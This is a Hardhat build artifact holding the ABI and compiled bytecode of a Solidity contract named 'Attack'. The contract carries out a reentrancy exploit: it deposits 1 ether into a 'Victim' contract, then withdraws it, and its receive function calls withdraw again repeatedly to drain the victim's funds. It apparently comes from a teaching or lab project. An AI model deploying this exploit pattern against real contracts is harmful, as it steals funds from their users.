{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Victim",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161064b38038061064b833981810160405281019061003291906100ed565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061011a565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b60006100ba8261009d565b9050919050565b6100ca816100af565b81146100d557600080fd5b50565b6000815190506100e7816100c1565b92915050565b60006020828403121561010357610102610078565b5b6000610111848285016100d8565b91505092915050565b610522806101296000396000f3fe6080604052600436106100385760003560e01c806312065fe014610162578063930c20031461018d5780639e5faafc146101b85761015d565b3661015d57670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d5919061037e565b1061015b5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014257600080fd5b505af1158015610156573d6000803e3d6000fd5b505050505b005b600080fd5b34801561016e57600080fd5b506101776101c2565b60405161018491906103ba565b60405180910390f35b34801561019957600080fd5b506101a26101ca565b6040516101af9190610454565b60405180910390f35b6101c06101ee565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003414610238576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161022f906104cc565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102a857600080fd5b505af11580156102bc573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561032957600080fd5b505af115801561033d573d6000803e3d6000fd5b50505050565b600080fd5b6000819050919050565b61035b81610348565b811461036657600080fd5b50565b60008151905061037881610352565b92915050565b60006020828403121561039457610393610343565b5b60006103a284828501610369565b91505092915050565b6103b481610348565b82525050565b60006020820190506103cf60008301846103ab565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061041a610415610410846103d5565b6103f5565b6103d5565b9050919050565b600061042c826103ff565b9050919050565b600061043e82610421565b9050919050565b61044e81610433565b82525050565b60006020820190506104696000830184610445565b92915050565b600082825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b00000000000000600082015250565b60006104b660198361046f565b91506104c182610480565b602082019050919050565b600060208201905081810360008301526104e5816104a9565b905091905056fea2646970667358221220cbdbbc713a4a67aecdccc8d5dbb8210ae5b0cfa80073207c77d9c21ddf5e3eeb64736f6c634300081c0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}